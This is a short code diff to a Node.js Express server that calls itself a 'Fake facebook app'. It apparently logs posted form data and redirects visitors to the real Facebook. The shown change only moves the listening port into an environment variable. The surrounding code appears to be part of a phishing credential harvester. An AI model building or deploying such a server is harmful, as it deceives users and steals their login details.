@@ -1,6 +1,6 @@
 const express = require('express')
 const app = express()
-const port = 80
+const PORT = process.env.PORT
 const bodyParser = require('body-parser')
 const log4js = require("log4js");
 log4js.configure({
@@ -26,4 +26,4 @@ app.post('/', function (req, res) {
     res.redirect("https://www.facebook.com/")
   })
 
-app.listen(port, () => console.log(`Fake facebook app listening at http://localhost:${port}`))
+app.listen(PORT, () => console.log(`Fake facebook app listening at http://localhost:${PORT}`))
